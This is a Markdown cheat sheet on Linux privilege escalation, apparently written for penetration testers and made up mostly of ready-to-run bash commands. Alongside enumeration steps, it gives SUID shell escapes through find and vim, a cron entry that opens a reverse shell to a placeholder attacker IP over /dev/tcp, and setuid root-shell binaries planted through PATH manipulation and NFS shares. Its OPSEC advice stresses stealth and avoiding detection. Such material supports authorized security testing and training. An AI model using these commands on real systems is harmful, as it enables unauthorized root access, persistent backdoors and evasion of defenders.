# Linux Privilege Escalation

### Overview

Privilege escalation in Linux involves techniques to gain higher-level access to a system, typically from a normal user to root access.

### Kernel Exploits

#### 1. Kernel Information

```bash
# Kernel Version
uname -a
cat /proc/version
dmesg | grep Linux

# Kernel Modules
lsmod
cat /proc/modules
```

#### 2. Exploit Search

```bash
# Search for Exploits
searchsploit <kernel_version>
exploit-db.com
github.com

# Compile and Run
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

### SUID/SGID Binaries

#### 1. Find SUID/SGID Files

```bash
# Find SUID Files
find / -type f -perm -4000 2>/dev/null
find / -type f -perm -u=s 2>/dev/null

# Find SGID Files
find / -type f -perm -2000 2>/dev/null
find / -type f -perm -g=s 2>/dev/null
```

#### 2. Common SUID/SGID Exploits

```bash
# GTFOBins
# https://gtfobins.github.io/

# Example: Using find
find / -name file -exec /bin/sh -p \;

# Example: Using vim
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

### Capabilities

#### 1. Check Capabilities

```bash
# List Capabilities
getcap -r / 2>/dev/null

# Common Capabilities
cap_setuid
cap_setgid
cap_net_bind_service
```

#### 2. Exploit Capabilities

```bash
# Example: Using cap_setuid
setcap cap_setuid+ep /path/to/binary
```

### Cron Jobs

#### 1. Check Cron Jobs

```bash
# List Cron Jobs
crontab -l
ls -la /etc/cron*
cat /etc/crontab

# Check Cron Directories
ls -la /etc/cron.d
ls -la /etc/cron.daily
ls -la /etc/cron.hourly
ls -la /etc/cron.monthly
ls -la /etc/cron.weekly
```

#### 2. Exploit Cron Jobs

```bash
# Create Reverse Shell
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" > /etc/cron.d/root
```

### Services

#### 1. Check Services

```bash
# List Services
systemctl list-units --type=service
service --status-all
ps aux | grep root

# Check Service Permissions
ls -la /etc/init.d/
ls -la /etc/systemd/system/
```

#### 2. Exploit Services

```bash
# Modify Service
systemctl edit <service>
systemctl daemon-reload
systemctl restart <service>
```

### Environment Variables

#### 1. Check Environment

```bash
# List Environment Variables
env
set
printenv

# Check PATH
echo $PATH
```

#### 2. Exploit Environment

```bash
# PATH Manipulation
export PATH=/tmp:$PATH
echo 'int main(){setuid(0);system("/bin/bash");}' > /tmp/suid.c
gcc /tmp/suid.c -o /tmp/suid
chmod +s /tmp/suid
```

### NFS

#### 1. Check NFS

```bash
# List NFS Shares
showmount -e <target>
cat /etc/exports

# Mount NFS
mount -t nfs <target>:/share /mnt
```

#### 2. Exploit NFS

```bash
# Create SUID Binary
echo 'int main(){setuid(0);system("/bin/bash");}' > /mnt/suid.c
gcc /mnt/suid.c -o /mnt/suid
chmod +s /mnt/suid
```

### Tools

#### 1. Primary Tools

* LinPEAS
* LinEnum
* Linux Exploit Suggester
* GTFOBins
* Metasploit

#### 2. Additional Tools

* Pspy
* Pspy64
* Linux Smart Enumeration
* BeRoot
* Unix Privesc Check

### Best Practices

#### 1. Escalation Strategy

* Start with automated tools
* Check common vectors
* Document findings
* Test exploits safely
* Follow engagement scope

#### 2. OPSEC Considerations

* Use stealth techniques
* Avoid detection
* Monitor for alerts
* Use legitimate tools
* Follow engagement scope

### Resources

* [GTFOBins](https://gtfobins.github.io/)
* [HackTricks Linux Privesc](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
* [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

***

_Last Updated: 2025-03-2_
